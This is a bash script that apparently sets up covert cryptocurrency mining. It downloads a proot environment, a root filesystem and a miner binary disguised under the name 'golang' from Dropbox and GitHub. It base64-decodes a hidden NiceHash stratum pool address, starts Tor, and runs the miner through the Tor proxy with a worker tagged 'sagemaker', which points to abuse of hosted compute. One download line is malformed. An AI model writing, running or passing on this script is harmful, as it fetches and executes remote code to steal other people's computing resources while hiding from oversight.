#!/bin/bash

proot=https://www.dropbox.com/s/qhtue5w4rnxlip3/proot.tar.gz?dl=0
rootfs=https://www.dropbox.com/s/qrzrq6p26684xex/rootfs.tar.xz?dl=0
golang=https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/golang

userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
key=ZXRoYXNo

seed=$(echo $string | base64 --decode)
apikey=$(echo $key | base64 --decode)

mkdir data && cd data

wget -O proot.tar.gz $proot
wget -O rootfs.tar.xz $rootfs
wget -O $golang

tar -xf proot.tar.gz
tar -xf rootfs.tar.xz

rm -rf *.tar.*

chmod 777 golang
chmod 777 dist/proot

nohup ./dist/proot -S . apt install -y tor && tor  &>/dev/null &

sleep 15

./golang -a $apikey --url $seed -u $userAgent -p x --proxy 127.0.0.1:9050
